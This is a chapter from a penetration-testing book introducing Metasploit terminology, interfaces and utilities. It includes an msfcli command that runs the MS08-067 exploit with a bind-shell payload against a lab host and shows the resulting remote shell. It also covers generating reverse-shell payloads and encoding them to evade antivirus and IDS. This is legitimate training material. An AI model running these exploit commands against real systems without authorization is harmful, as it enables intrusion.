<html><head></head><body><section epub:type="chapter" id="metasploit_basics"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 2. Metasploit Basics</h2></div></div></div><p class="calibre2">When you encounter the Metasploit Framework (MSF) for the first time, you might be overwhelmed by its many interfaces, options, utilities, variables, and modules. In this chapter, we’ll focus on the basics that will help you make sense of the big picture. We’ll review some basic penetration testing terminology and then briefly cover the various user interfaces that Metasploit has to offer. Metasploit itself is free, open source software, with many contributors in the security community, but two commercial Metasploit versions are also available.<a id="IDX-CHP-2-0001" class="strong"/><a id="IDX-CHP-2-0002" class="strong"/><a id="IDX-CHP-2-0003" class="strong"/></p><p class="calibre2">When first using Metasploit, it’s important not to get hung up on that newest exploit; instead, focus on how Metasploit functions and what commands you used to make the exploit possible.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="terminology">Terminology</h2></div></div></div><p class="calibre2">Throughout this book, we’ll use various terms that first bear some explanation. The majority of the following basic terms are defined in the context of Metasploit, but they are generally the same throughout the security industry.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="exploit">Exploit</h3></div></div></div><p class="calibre2">An <span class="strong"><em class="calibre4">exploit</em></span> is the means by which an attacker, or pen tester for that matter, takes advantage of a flaw within a system, an application, or a service. An attacker uses an exploit to attack a system in a way that results in a particular desired outcome that the developer never intended. Common exploits include buffer overflows, web application vulnerabilities (such as SQL injection), and configuration errors.<a id="IDX-CHP-2-0004" class="strong"/><a id="IDX-CHP-2-0005" class="strong"/><a id="IDX-CHP-2-0006" class="strong"/><a id="IDX-CHP-2-0007" class="strong"/><a id="IDX-CHP-2-0008" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="payload">Payload</h3></div></div></div><p class="calibre2">A <span class="strong"><em class="calibre4">payload</em></span> is code that we want the system to execute and that is to be selected and delivered by the Framework. For example, a <span class="strong"><em class="calibre4">reverse shell</em></span> is a payload that creates a connection from the target machine back to the attacker as a Windows command prompt (see <a class="xref" href="part0009.html#the_joy_of_exploitation">Chapter 5</a>), whereas a <span class="strong"><em class="calibre4">bind shell</em></span> is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect. A payload could also be something as simple as a few commands to be executed on the target operating system.<a id="IDX-CHP-2-0009" class="strong"/><a id="IDX-CHP-2-0010" class="strong"/><a id="IDX-CHP-2-0011" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="shellcode">Shellcode</h3></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Shellcode</em></span> is a set of instructions used as a payload when exploitation occurs. Shellcode is typically written in assembly language. In most cases, a command shell or a Meterpreter shell will be provided after the series of instructions have been performed by the target machine, hence the name.<a id="IDX-CHP-2-0012" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="module">Module</h3></div></div></div><p class="calibre2">A <span class="strong"><em class="calibre4">module</em></span> in the context of this book is a piece of software that can be used by the Metasploit Framework. At times, you may require the use of an <span class="strong"><em class="calibre4">exploit module</em></span>, a software component that conducts the attack. Other times, an <span class="strong"><em class="calibre4">auxiliary module</em></span> may be required to perform an action such as scanning or system enumeration. These interchangeable modules are the core of what makes the Framework so powerful.<a id="IDX-CHP-2-0013" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="listener">Listener</h3></div></div></div><p class="calibre2">A <span class="strong"><em class="calibre4">listener</em></span> is a component within Metasploit that waits for an incoming connection of some sort. For example, after the target machine has been exploited, it may call the attacking machine over the Internet. The listener handles that connection, waiting on the attacking machine to be contacted by the exploited system.<a id="IDX-CHP-2-0014" class="strong"/></p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="metasploit_interfaces">Metasploit Interfaces</h2></div></div></div><p class="calibre2">Metasploit offers more than one interface to its underlying functionality, including console, command line, and graphical interfaces. In addition to these interfaces, utilities provide direct access to functions that are normally internal to the Metasploit Framework. These utilities can be invaluable for exploit development and situations for which you do not need the flexibility of the entire Framework.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfconsole">MSFconsole</h3></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Msfconsole</em></span> is by far the most popular part of the Metasploit Framework, and for good reason. It is one of the most flexible, feature-rich, and well-supported tools within the Framework. <span class="strong"><em class="calibre4">Msfconsole</em></span> provides a handy all-in-one interface to almost every option and setting available in the Framework; it’s like a one-stop shop for all of your exploitation dreams. You can use <span class="strong"><em class="calibre4">msfconsole</em></span> to do everything, including launching an exploit, loading auxiliary modules, performing enumeration, creating listeners, or running mass exploitation against an entire network.<a id="IDX-CHP-2-0015" class="strong"/><a id="IDX-CHP-2-0016" class="strong"/><a id="IDX-CHP-2-0017" class="strong"/><a id="IDX-CHP-2-0018" class="strong"/><a id="IDX-CHP-2-0019" class="strong"/><a id="IDX-CHP-2-0020" class="strong"/><a id="IDX-CHP-2-0021" class="strong"/><a id="IDX-CHP-2-0022" class="strong"/></p><p class="calibre2">Although the Metasploit Framework is constantly changing, a subset of commands remain relatively constant. By mastering the basics of <span class="strong"><em class="calibre4">msfconsole</em></span>, you will be able to keep up with any changes. To illustrate the importance of learning <span class="strong"><em class="calibre4">msfconsole</em></span>, it will be used in nearly every chapter of the book.</p><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="starting_msfconsole">Starting MSFconsole</h4></div></div></div><p class="calibre2">To launch <span class="strong"><em class="calibre4">msfconsole</em></span>, enter <strong class="calibre3"><code class="calibre6">msfconsole</code></strong> at the command line:</p><a id="I_programlisting2_d1e798" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">cd /opt/framework3/msf3/</code></strong>
root@bt:/opt/framework/msf3# <strong class="calibre3"><code class="calibre6">msfconsole</code></strong>
&lt; metasploit &gt;
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *
msf &gt;</pre><p class="calibre2">To access <span class="strong"><em class="calibre4">msfconsole</em></span>’s help files, enter <strong class="calibre3"><code class="calibre6">help</code></strong> followed by the command which you are interested in. In the next example, we are looking for help for the command <code class="literal">connect</code>, which allows us to communicate with a host. The resulting documentation lists usage, a description of the tool, and the various option flags.</p><a id="I_programlisting2_d1e817" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">help connect</code></strong></pre><p class="calibre2">We’ll explore MSFConsole in greater depth in the chapters that follow.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfcli">MSFcli</h3></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Msfcli</em></span> and <span class="strong"><em class="calibre4">msfconsole</em></span> take very different approaches to providing access to the Framework. Where <span class="strong"><em class="calibre4">msfconsole</em></span> provides an interactive way to access all features in a user-friendly manner, <span class="strong"><em class="calibre4">msfcli</em></span> puts the priority on scripting and interpretability with other console-based tools. Instead of providing a unique interpreter to the Framework, <span class="strong"><em class="calibre4">msfcli</em></span> runs directly from the command line, which allows you to redirect output from other tools into <span class="strong"><em class="calibre4">msfcli</em></span> and direct <span class="strong"><em class="calibre4">msfcli</em></span> output to other command-line tools. <span class="strong"><em class="calibre4">Msfcli</em></span> also supports the launching of exploits and auxiliary modules, and it can be convenient when testing modules or developing new exploits for the Framework. It is a fantastic tool for unique exploitation when you know exactly which exploit and options you need. It is less forgiving than <span class="strong"><em class="calibre4">msfconsole</em></span>, but it offers some basic help (including usage and a list of modes) with the command <code class="literal">msfcli -h</code>, as shown here:<a id="IDX-CHP-2-0023" class="strong"/><a id="IDX-CHP-2-0024" class="strong"/><a id="IDX-CHP-2-0025" class="strong"/><a id="IDX-CHP-2-0026" class="strong"/></p><a id="I_programlisting2_d1e871" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# msfcli -h
Usage: /opt/framework3/msf3/msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]
==============================================================================

   Mode           Description
   ----           ---------------
   (H)elp         You're looking at it, baby!
   (S)ummary      Show information about this module
   (O)ptions      Show available options for this module
   (A)dvanced     Show available advanced options for this module
   (I)DS Evasion  Show available ids evasion options for this module
   (P)ayloads     Show available payloads for this module
   (T)argets      Show available targets for this exploit module
   (AC)tions      Show available actions for this auxiliary module
   (C)heck        Run the check routine of the selected module
   (E)xecute      Execute the selected module

root@bt:/opt/framework3/msf3#</pre><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="sample_usage">Sample Usage</h4></div></div></div><p class="calibre2">Let’s take a look at how you might use <span class="strong"><em class="calibre4">msfcli</em></span>. Don’t worry about the details; these examples are intended to give you a sense of how you might work with this interface.</p><p class="calibre2">When you are first learning Metasploit or whenever you get stuck, you can see the options available in a module by appending the letter <code class="literal">O</code> to the end of the string at whichever point you are stuck. For example, in the following listing, we use the <code class="literal">O</code> to see the options available for the <span class="strong"><em class="calibre4">ms08_067_netapi</em></span> module:</p><a id="I_programlisting2_d1e892" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfcli windows/smb/ms08_067_netapi O</code></strong>
[*] Please wait while we load the module tree...

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    0.0.0.0          yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</pre><p class="calibre2">You can see that the module requires three options: <code class="literal">RHOST</code>, <code class="literal">RPORT</code>, and <code class="literal">SMPIPE</code>. Now, by adding a <code class="literal">P</code>, we can check for available payloads:</p><a id="I_programlisting2_d1e911" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 P</code></strong>
[*] Please wait while we load the module tree...

Compatible payloads
===================

   Name                                   Description
   ----                                   -----------
   generic/debug_trap                     Generate a debug trap in the target process
   generic/shell_bind_tcp                 Listen for a connection
 and spawn a command shell</pre><p class="calibre2">Having set all the required options for our exploit and selecting a payload, we can run our exploit by passing the letter <code class="literal">E</code> to the end of the <span class="strong"><em class="calibre4">msfcli</em></span> argument string, as shown here:<a id="IDX-CHP-2-0027" class="strong"/><a id="IDX-CHP-2-0028" class="strong"/><a id="IDX-CHP-2-0029" class="strong"/><a id="IDX-CHP-2-0030" class="strong"/><a id="IDX-CHP-2-0031" class="strong"/></p><a id="I_programlisting2_d1e945" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfcli windows/smb/ms08_067_netapi</code></strong>
 <strong class="calibre3"><code class="calibre6">RHOST=192.168.1.155 PAYLOAD=windows/shell/bind_tcp E</code></strong>
[*] Please wait while we load the module tree...
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP Service Pack 2 - lang:English
[*] Selected Target: Windows XP SP2 English (NX)
[*] Triggering the vulnerability...
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.1.101:46025 -&gt; 192.168.1.155:4444)

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;</pre><p class="calibre2">We’re successful, because we have received a Windows command prompt from the remote system.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="armitage">Armitage</h3></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">armitage</em></span> component of Metasploit is a fully interactive graphical user interface created by Raphael Mudge. This interface is highly impressive, feature rich, and available for free. We won’t be covering <span class="strong"><em class="calibre4">armitage</em></span> in depth, but it is definitely worth mentioning as something to explore. Our goal is to teach the ins and outs of Metasploit, and the GUI is awesome once you understand how the Framework actually operates.<a id="IDX-CHP-2-0032" class="strong"/></p><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="running_armitage">Running Armitage</h4></div></div></div><p class="calibre2">To launch <span class="strong"><em class="calibre4">armitage</em></span>, run the command <code class="literal">armitage</code>. During startup, select <span class="strong"><strong class="calibre3">Start MSF</strong></span>, which will allow <span class="strong"><em class="calibre4">armitage</em></span> to connect to your Metasploit instance.</p><a id="I_programlisting2_d1e986" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">armitage</code></strong></pre><p class="calibre2">After <span class="strong"><em class="calibre4">armitage</em></span> is running, simply click a menu to perform a particular attack or access other Metasploit functionality. For example, <a class="xref" href="part0006.html#the_armitageas_browser_exploit_menu">Figure 2-1</a> shows the browser (client-side) exploits.</p><div class="figure"><a id="the_armitageas_browser_exploit_menu" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject2_d1e1003" class="strong"/><img src="../images/00001.jpeg" alt="The armitage’s browser exploit menu" hisrc="httpatomoreillycomsourcenostarchimages867456.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 2-1. The <span class="strong"><em class="calibre4">armitage</em></span>’s browser exploit menu</div></div></div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="metasploit_utilities">Metasploit Utilities</h2></div></div></div><p class="calibre2">Having covered Metasploit’s three main interfaces, it’s time to cover a few utilities. Metasploit’s utilities are direct interfaces to particular features of the Framework that can be useful in specific situations, especially in exploit development. We will cover some of the more approachable utilities here and introduce additional ones throughout the book.<a id="IDX-CHP-2-0033" class="strong"/><a id="IDX-CHP-2-0034" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfpayload">MSFpayload</h3></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">msfpayload</em></span> component of Metasploit allows you to generate shellcode, executables, and much more for use in exploits outside of the Framework.<a id="IDX-CHP-2-0035" class="strong"/><a id="IDX-CHP-2-0036" class="strong"/><a id="IDX-CHP-2-0037" class="strong"/><a id="IDX-CHP-2-0038" class="strong"/></p><p class="calibre2">Shellcode can be generated in many formats including C, Ruby, JavaScript, and even Visual Basic for Applications. Each output format will be useful in various situations. For example, if you are working with a Python-based proof of concept, C-style output might be best; if you are working on a browser exploit, a JavaScript output format might be best. After you have your desired output, you can easily insert the payload directly into an HTML file to trigger the exploit.<a id="IDX-CHP-2-0039" class="strong"/><a id="IDX-CHP-2-0040" class="strong"/></p><p class="calibre2">To see which options the utility takes, enter <strong class="calibre3"><code class="calibre6">msfpayload -h</code></strong> at the command line, as shown here:<a id="IDX-CHP-2-0041" class="strong"/><a id="IDX-CHP-2-0042" class="strong"/><a id="IDX-CHP-2-0043" class="strong"/><a id="IDX-CHP-2-0044" class="strong"/><a id="IDX-CHP-2-0045" class="strong"/><a id="IDX-CHP-2-0046" class="strong"/><a id="IDX-CHP-2-0047" class="strong"/><a id="IDX-CHP-2-0048" class="strong"/><a id="IDX-CHP-2-0049" class="strong"/><a id="IDX-CHP-2-0050" class="strong"/><a id="IDX-CHP-2-0051" class="strong"/></p><a id="I_programlisting2_d1e1104" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfpayload -h</code></strong></pre><p class="calibre2">As with <span class="strong"><em class="calibre4">msfcli</em></span>, if you find yourself stuck on the required options for a payload module, append the letter <code class="literal">O</code> on the command line for a list of required and optional variables, like so:</p><a id="I_programlisting2_d1e1116" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">msfpayload windows/shell_reverse_tcp O</code></strong></pre><p class="calibre2">We will dive much deeper into <span class="strong"><em class="calibre4">msfpayload</em></span> as we explore exploit development in later chapters.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="msfencode">MSFencode</h3></div></div></div><p class="calibre2">The shellcode generated by <span class="strong"><em class="calibre4">msfpayload</em></span> is fully functional, but it contains several null characters that, when interpreted by many programs, signify the end of a string, and this will cause the code to terminate before completion. In other words, those <code class="literal">x00</code>s and <code class="literal">xff</code>s can break your payload!</p><p class="calibre2">In addition, shellcode traversing a network in cleartext is likely to be picked up by intrusion detection systems (IDSs) and antivirus software. To address this problem, Metasploit’s developers offer <span class="strong"><em class="calibre4">msfencode</em></span>, which helps you to avoid bad characters and evade antivirus and IDSs by encoding the original payload in a way that does not include “bad” characters. Enter <strong class="calibre3"><code class="calibre6">msfencode -h</code></strong> to see a list of <span class="strong"><em class="calibre4">msfencode</em></span> options.<a id="IDX-CHP-2-0052" class="strong"/><a id="IDX-CHP-2-0053" class="strong"/><a id="IDX-CHP-2-0054" class="strong"/></p><p class="calibre2">Metasploit contains a number of different encoders for specific situations. Some will be useful when you can use only alphanumeric characters as part of a payload, as is the case with many file format exploits or other applications that accept only printable characters as input, while others are great general purpose encoders that do well in every situation.<a id="IDX-CHP-2-0055" class="strong"/><a id="IDX-CHP-2-0056" class="strong"/></p><p class="calibre2">When in doubt, though, you really can’t go wrong with the <span class="strong"><em class="calibre4">x86/shikata_ ga_nai</em></span> encoder, the only encoder with the rank of Excellent, a measure of the reliability and stability of a module. In the context of an encoder, an Excellent ranking implies that it is one of the most versatile encoders and can accommodate a greater degree of fine-tuning than other encoders. To see the list of encoders available, append <code class="literal">-l</code> to <code class="literal">msfencode</code> as shown next. The payloads are ranked in order of reliability.</p><a id="I_programlisting2_d1e1184" class="strong"/><pre class="programlisting">root@bt:˜# <strong class="calibre3"><code class="calibre6">msfencode -l</code></strong></pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="nasm_shell">Nasm Shell</h3></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">nasm_shell.rb</em></span> utility can be handy when you’re trying to make sense of assembly code, especially if, during exploit development, you need to identify the <span class="strong"><em class="calibre4">opcodes</em></span> (the assembly instructions) for a given assembly command.<a id="IDX-CHP-2-0057" class="strong"/></p><p class="calibre2">For example, here we run the tool and request the opcodes for the <code class="literal">jmp esp</code> command, which <code class="literal">nasm_shell</code> tells us is FFE4.<a id="IDX-CHP-2-0058" class="strong"/><a id="IDX-CHP-2-0059" class="strong"/><a id="IDX-CHP-2-0060" class="strong"/></p><a id="I_programlisting2_d1e1219" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3/tools# <strong class="calibre3"><code class="calibre6">./nasm_shell.rb</code></strong>

nasm &gt; <strong class="calibre3"><code class="calibre6">jmp esp</code></strong>
00000000  FFE4              jmp esp</pre></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="metasploit_express_and_metasploit_pro">Metasploit Express and Metasploit Pro</h2></div></div></div><p class="calibre2">Metasploit Express and Metasploit Pro are commercial web interfaces to the Metasploit Framework. These utilities provide substantial automation and make things easier for new users, while still providing full access to the Framework. Both products also provide tools that are unavailable in the community editions of the Framework, such as automated password brute forcing and automated website attacks. In addition, a nice reporting backend to Metasploit Pro can speed up one of the least popular aspects of penetration testing: writing the report.</p><p class="calibre2">Are these tools worth purchasing? Only you can make that choice. The commercial editions of Metasploit are intended for professional penetration testers and can ease many of the more routine aspects of the job, but if the time savings from the automations in these commercial products are useful for you, they might justify the purchase price.</p><p class="calibre2">Remember, however, as you automate your work, that humans are better at identifying attack vectors than automated tools.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up">Wrapping Up</h2></div></div></div><p class="calibre2">In this chapter, you learned a little bit of the basics of the Metasploit Framework. As you progress through this book, you will begin using these tools in a much more advanced capacity. You’ll find a few different ways to accomplish the same tasks using different tools. It will ultimately be up to you to decide which tool best suits your needs.</p><p class="calibre2">Now that you have the basics under control, let’s move to the next phase of the pen testing process: discovery.</p></div></section></body></html>